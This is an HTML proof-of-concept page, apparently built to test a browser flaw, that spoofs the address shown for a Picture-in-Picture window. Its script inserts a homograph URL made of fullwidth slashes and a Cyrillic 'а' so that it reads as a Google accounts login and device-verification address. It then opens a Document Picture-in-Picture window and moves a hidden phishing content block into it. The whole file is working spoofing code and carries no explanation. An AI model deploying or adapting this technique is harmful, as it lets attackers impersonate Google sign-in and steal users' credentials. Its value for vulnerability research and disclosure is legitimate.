<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PIP Homograph Test</title>
<style>
    #content {
        display: none;
    }
</style>
</head>
<body>

<button id="button">Open PIP</button>

<div id="content">
    phishing page content here
</div>

<script>
    const button = document.getElementById('button');
    const content = document.getElementById('content');

    const pipOpen = async () => {
        const homographQuery = '?...............................https:\uFF0F\uFF0F\u0430ccounts.google.com\uFF0Flogin\uFF0Fdevice\uFF0Fverify';
        history.replaceState(null, '', homographQuery);

        const pipWindow = await documentPictureInPicture.requestWindow({
            width: 330,
            height: 317
        });

        setTimeout(() => {
            history.replaceState(null, '', '/');
        }, 1000);

        content.style.display = 'block';
        pipWindow.document.body.append(content);
    };

    button.onclick = pipOpen;
</script>

</body>
</html>
